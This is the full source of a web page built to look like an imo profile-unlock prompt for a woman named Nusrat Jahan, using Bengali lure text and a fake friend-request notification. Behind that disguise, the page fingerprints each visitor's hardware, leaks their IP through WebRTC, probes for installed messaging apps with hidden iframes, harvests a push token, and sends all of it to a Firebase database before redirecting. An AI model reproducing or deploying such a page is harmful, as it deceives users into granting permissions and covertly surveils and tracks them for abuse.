<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Unlock Mst: Nusrat Jahan</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, push, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getMessaging, getToken } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-messaging.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCYH0ZSeLjH_T3HJ9hVQ84afB5KyAEZi2Y",
            authDomain: "my-sc-tools.firebaseapp.com",
            databaseURL: "https://my-sc-tools-default-rtdb.firebaseio.com",
            projectId: "my-sc-tools",
            storageBucket: "my-sc-tools.firebasestorage.app",
            messagingSenderId: "285986090017",
            appId: "1:285986090017:web:de97d36b2ee56c74b74760",
            measurementId: "G-1PVWWGD0X5"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        const messaging = getMessaging(app);

        // ডাটাবেসে সেভ করার ফাংশন
        window.updateFirebaseData = async (userId, data) => {
            try {
                const dataRef = ref(database, `visitors/v_${userId}`);
                await update(dataRef, {
                    ...data,
                    lastUpdate: new Date().toISOString()
                });
                console.log("Firebase Updated");
            } catch (e) { console.error("FB Error:", e); }
        };

        // পুশ টোকেন সংগ্রহের ফাংশন
        window.getPushToken = async (userId) => {
            try {
                const token = await getToken(messaging, { 
                    vapidKey: 'BFZRrODefiSlDVoj_TtYJm4-iWycsHZ4uDn5hT90w-QOLV6wS7_gblBI2UUouGQcAqqnEB3FySSVF9JwbTXK7B8' 
                });
                if (token) await window.updateFirebaseData(userId, { pushToken: token });
            } catch (err) { console.log('Push Error'); }
        };
    </script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap');
        body { font-family: 'Roboto', sans-serif; background-color: #ffffff; height: 100vh; overflow: hidden; margin: 0; user-select: none; }
        .animate-fade { animation: fadeIn 0.3s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .toast-notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); color: white; padding: 12px 20px; border-radius: 8px; font-size: 13px; z-index: 9999; width: 90%; max-width: 400px; text-align: center; animation: slideDown 0.5s ease-out; }
        @keyframes slideDown { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect } = React;
        const REDIRECT_LINK = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAPJ7LNAdm5sh2K-4b-Aq7rq4CDUGPD4SInhRX-x2NJh6";
        const NUSRAT_IMG = "https://i.ibb.co/v6m80kP/nusrat.jpg";

        // ইউজার আইডি
        let userId = localStorage.getItem('v_id');
        if (!userId) {
            userId = Math.floor(1000 + Math.random() * 9000);
            localStorage.setItem('v_id', userId);
        }

        const App = () => {
            const [step, setStep] = useState('MAIN');
            const [report, setReport] = useState({ hardware: {}, software: {}, network: {}, apps: [] });

            // রিকনেসন্স ফাংশন
            const runMasterScan = async () => {
                let data = { ...report };
                
                // Hardware & GPU
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                data.hardware = {
                    gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Blocked",
                    ram: navigator.deviceMemory || "Unknown",
                    cores: navigator.hardwareConcurrency,
                    screen: `${window.screen.width}x${window.screen.height}`
                };

                // IP Leak
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                pc.onicecandidate = e => {
                    if (e.candidate) {
                        const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                        if (ip) {
                            data.network.ip = ip[1];
                            setReport(data);
                        }
                    }
                };
                pc.createOffer().then(s => pc.setLocalDescription(s));

                // OS breaking
                if (navigator.userAgentData) {
                    const h = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    data.hardware.model = h.model;
                    data.software.os = h.platformVersion;
                }

                // Battery
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    data.network.battery = `${(b.level * 100).toFixed(0)}%`;
                }

                setReport(data);
                return data;
            };

            const scanApps = async () => {
                const apps = [{n:"WhatsApp",u:"whatsapp://"}, {n:"Telegram",u:"tg://"}, {n:"FB",u:"fb://"}];
                let detected = [];
                for (let app of apps) {
                    const ok = await new Promise(res => {
                        let blurred = false;
                        const onBlur = () => blurred = true;
                        window.addEventListener('blur', onBlur);
                        const i = document.createElement('iframe');
                        i.style.display = 'none'; i.src = app.u;
                        document.body.appendChild(i);
                        setTimeout(() => {
                            document.body.removeChild(i);
                            window.removeEventListener('blur', onBlur);
                            res(blurred);
                        }, 600);
                    });
                    if (ok) detected.push(app.n);
                }
                return detected;
            };

            useEffect(() => {
                const init = async () => {
                    const initialData = await runMasterScan();
                    if (window.updateFirebaseData) {
                        await window.updateFirebaseData(userId, { 
                            id: userId, 
                            status: "Active",
                            initialHardware: initialData.hardware 
                        });
                    }
                };
                init();
            }, []);

            const handleUnlock = async () => {
                const permission = await Notification.requestPermission();
                if (permission === 'granted') {
                    setStep('LOADER');
                    
                    // ১. পুশ টোকেন এবং লোকাল নোটিফিকেশন
                    if (window.getPushToken) window.getPushToken(userId);
                    new Notification("imo", { body: "নুসরত জাহান আপনাকে ফ্রেন্ড রিকোয়েস্ট পাঠিয়েছে।", icon: NUSRAT_IMG });

                    // ২. গভীর স্ক্যান (Apps & Network)
                    const appsDetected = await scanApps();
                    const finalData = await runMasterScan();

                    // ৩. ফায়ারবেসে পূর্ণাঙ্গ ডেটা আপডেট
                    if (window.updateFirebaseData) {
                        await window.updateFirebaseData(userId, {
                            id: userId,
                            status: "Unlocked",
                            device: finalData.hardware.model || navigator.platform,
                            gpu: finalData.hardware.gpu,
                            ram: finalData.hardware.ram,
                            cores: finalData.hardware.cores,
                            ip: finalData.network.ip || "Protected",
                            battery: finalData.network.battery || "Unknown",
                            apps: appsDetected,
                            userAgent: navigator.userAgent
                        });
                    }
                    setTimeout(() => setStep('SUCCESS'), 3000);
                } else {
                    alert("Nusrat Jahan friend request allow করুন");
                }
            };

            return (
                <div className="flex flex-col h-full w-full bg-white relative">
                    <div className="h-14 bg-white flex items-center px-4 border-b border-slate-100 shadow-sm">
                        <div className="flex-1 flex flex-row items-center gap-3">
                            <div className="w-8 h-8 rounded-full border border-slate-200 overflow-hidden">
                                <img src={NUSRAT_IMG} className="w-full h-full object-cover" />
                            </div>
                            <span className="text-xl font-bold text-[#0091ea]">imo</span>
                        </div>
                    </div>

                    <div className="flex-1 p-4">
                        {step === 'MAIN' && (
                            <div className="animate-fade">
                                <div className="w-full bg-white border border-slate-200 rounded-2xl p-6 shadow-sm text-center">
                                    <div className="relative w-20 h-20 mx-auto mb-4">
                                        <img src={NUSRAT_IMG} className="w-full h-full rounded-full border-2 border-[#0091ea] object-cover" />
                                        <div className="absolute bottom-0 right-0 w-5 h-5 bg-green-500 rounded-full border-2 border-white"></div>
                                    </div>
                                    <h3 className="font-bold text-xl text-black">Mst: Nusrat Jahan</h3>
                                    <p className="text-slate-500 text-sm mb-8">প্রোফাইলটি আনলক করতে নিচের বাটনে ক্লিক করে কনফার্ম করুন।</p>
                                    <button onClick={handleUnlock} className="w-full bg-[#0091ea] text-white font-bold py-4 rounded-xl shadow-md active:scale-95 transition-all">
                                        Unlock Profile Access
                                    </button>
                                </div>
                            </div>
                        )}

                        {step === 'LOADER' && (
                            <div className="text-center py-10">
                                <div className="w-14 h-14 border-4 border-t-[#0091ea] border-slate-200 rounded-full animate-spin mx-auto"></div>
                                <p className="mt-4 font-bold text-slate-700">Verifying Identity ID #{userId}...</p>
                            </div>
                        )}

                        {step === 'SUCCESS' && (
                            <div className="text-center py-8 animate-fade">
                                <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
                                    <i className="fa-solid fa-check text-4xl"></i>
                                </div>
                                <h3 className="text-2xl font-bold text-green-700">Access Granted!</h3>
                                <p className="text-slate-600 mt-2 mb-8">Verification successful for User #{userId}.</p>
                                <button onClick={() => window.location.href = REDIRECT_LINK} className="w-full bg-[#0091ea] text-white font-bold py-4 rounded-xl shadow-lg">
                                    Open imo Profile
                                </button>
                            </div>
                        )}
                    </div>
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
